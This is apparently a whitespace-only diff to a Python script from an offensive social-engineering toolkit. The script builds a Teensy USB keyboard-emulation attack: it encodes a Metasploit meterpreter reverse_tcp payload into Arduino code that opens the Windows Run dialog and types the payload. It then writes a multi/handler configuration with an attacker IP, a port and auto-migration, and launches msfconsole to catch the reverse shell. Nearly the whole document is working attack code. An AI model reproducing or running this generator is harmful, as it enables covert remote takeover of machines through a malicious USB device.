@@ -13,11 +13,11 @@ payload = raw_input("Select payload you want to delivery via the powershell - sh
 if payload == "": payload = "2"
 
 if payload == "1":
-        path = "src/program_junk/x86.powershell"
-        payload = "windows/meterpreter/reverse_tcp"
+    path = "src/program_junk/x86.powershell"
+    payload = "windows/meterpreter/reverse_tcp"
 if payload == "2":
-        path = "src/program_junk/x64.powershell" 
-        payload = "windows/x64/meterpreter/reverse_tcp"
+    path = "src/program_junk/x64.powershell"
+    payload = "windows/x64/meterpreter/reverse_tcp"
 
 
 # create base metasploit payload to pass to powershell.prep
@@ -38,21 +38,21 @@ output_variable = "#include <avr/pgmspace.h>\n"
 counter = 0
 
 while 1:
-        reading_encoded = fileopen.read(data_read).rstrip()        
-        if reading_encoded == "": break
-        output_variable += 'prog_char RevShell_%s[] PROGMEM = "%s";\n' % (counter,reading_encoded)
-        counter = counter + 1
+    reading_encoded = fileopen.read(data_read).rstrip()
+    if reading_encoded == "": break
+    output_variable += 'prog_char RevShell_%s[] PROGMEM = "%s";\n' % (counter,reading_encoded)
+    counter = counter + 1
 
 rev_counter = 0
 output_variable += "PROGMEM const char *exploit[] = {\n"
 
 while rev_counter != counter:
-        output_variable+="RevShell_%s" % rev_counter
-        rev_counter = rev_counter +1
-        if rev_counter == counter:
-                output_variable+="};\n"
-        if rev_counter != counter:
-                output_variable+=",\n"
+    output_variable+="RevShell_%s" % rev_counter
+    rev_counter = rev_counter +1
+    if rev_counter == counter:
+        output_variable+="};\n"
+    if rev_counter != counter:
+        output_variable+=",\n"
 
 teensy = output_variable
 
@@ -61,7 +61,7 @@ teensy+=("""
 char buffer[55];
 int ledPin = 11;
 
-void setup() { 
+void setup() {
   pinMode(ledPin, OUTPUT);
 }
 void loop()
@@ -77,7 +77,7 @@ void loop()
     strcpy_P(buffer, (char*)pgm_read_word(&(exploit[i])));
     Keyboard.print(buffer);
     delay(30);
-  } 
+  }
   // ADJUST THIS DELAY IF HEX IS COMING OUT TO FAST!
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
@@ -114,12 +114,12 @@ Keyboard.send_now();
 }
 // Taken from IronGeek
 void CommandAtRunBar(char *SomeCommand){
-  Keyboard.set_modifier(128); 
-  Keyboard.set_key1(KEY_R); 
-  Keyboard.send_now(); 
-  Keyboard.set_modifier(0); 
-  Keyboard.set_key1(0); 
-  Keyboard.send_now(); 
+  Keyboard.set_modifier(128);
+  Keyboard.set_key1(KEY_R);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
   delay(1500);
   Keyboard.print(SomeCommand);
   Keyboard.set_key1(KEY_ENTER);
@@ -150,24 +150,24 @@ choice = yesno_prompt("0","Do you want to start a listener [yes/no]: ")
 if choice == "YES":
 
 
-        # Open the IPADDR file
-        if check_options("IPADDR=") != 0:
-                ipaddr = check_options("IPADDR=")
-        else:
-                ipaddr=raw_input(setprompt(["6"], "IP address to connect back on"))
-                update_options("IPADDR=" + ipaddr)
-	
-	if check_options("PORT=") != 0:
-		port = check_options("PORT=")	
+    # Open the IPADDR file
+    if check_options("IPADDR=") != 0:
+        ipaddr = check_options("IPADDR=")
+    else:
+        ipaddr=raw_input(setprompt(["6"], "IP address to connect back on"))
+        update_options("IPADDR=" + ipaddr)
 
-	else:
-		port = raw_input("Enter the port to connect back on: ")
+    if check_options("PORT=") != 0:
+        port = check_options("PORT=")
 
-        filewrite = file("src/program_junk/metasploit.answers", "w")
-        filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset AutoRunScript post/windows/manage/smart_migrate\nexploit -j" % (payload,ipaddr,port))
-        filewrite.close()
-        print "[*] Launching Metasploit...."
-        try:
-                child = pexpect.spawn("msfconsole -r src/program_junk/metasploit.answers")
-                child.interact()
-        except: pass               
+    else:
+        port = raw_input("Enter the port to connect back on: ")
+
+    filewrite = file("src/program_junk/metasploit.answers", "w")
+    filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset AutoRunScript post/windows/manage/smart_migrate\nexploit -j" % (payload,ipaddr,port))
+    filewrite.close()
+    print "[*] Launching Metasploit...."
+    try:
+        child = pexpect.spawn("msfconsole -r src/program_junk/metasploit.answers")
+        child.interact()
+    except: pass
